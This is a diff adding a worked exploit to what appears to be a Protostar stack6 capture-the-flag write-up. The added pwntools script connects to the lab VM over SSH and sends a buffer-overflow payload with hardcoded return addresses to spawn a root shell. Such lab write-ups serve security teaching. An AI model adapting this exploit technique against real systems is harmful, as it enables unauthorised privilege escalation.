@@ -257,3 +257,71 @@ We are effective root:
 id
 uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
 ```
+
+## Writeup
+
+```python
+#!/usr/bin/python3
+from pwn import *
+
+# Set context
+context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
+
+# Set up pwntools for the correct architecture
+exe = context.binary = ELF('stack6')
+
+host = args.HOST or 'protostar'
+port = int(args.PORT or 22)
+user = args.USER or 'user'
+password = args.PASSWORD or 'user'
+remote_path = '/opt/protostar/bin/stack6'
+
+# Connect to the remote SSH server
+shell = None
+if not args.LOCAL:
+    shell = ssh(user, host, port, password)
+    shell.set_working_directory(symlink=True)
+
+
+def local(argv=[], *a, **kw):
+    '''Execute the target binary locally'''
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+
+def remote(argv=[], *a, **kw):
+    '''Execute the target binary on the remote host'''
+    if args.GDB:
+        return gdb.debug([remote_path] + argv,
+                         gdbscript=gdbscript,
+                         ssh=shell,
+                         *a,
+                         **kw)
+    else:
+        return shell.run([remote_path] + argv, *a, **kw)
+
+
+def start(argv=[], *a, **kw):
+    '''Start the exploit against the target.'''
+    if args.LOCAL:
+        return local(argv, *a, **kw)
+    else:
+        return remote(argv, *a, **kw)
+
+
+# Specify your GDB script here for debugging
+# GDB will be launched if the exploit is run via e.g.
+# ./exploit.py GDB
+gdbscript = '''
+break *0x080484aa
+continue
+'''.format(**locals())
+
+io = start(env={})
+shell_name = b'/bin//sh\x00'
+payload = shell_name + b'a' * (64-len(shell_name)) + b'junk' * 4 + p32(0xb7ecffb0) + p32(0xb7ec60c0) + p32(0xbffffc9c)
+io.sendline(payload)
+io.interactive()
+```
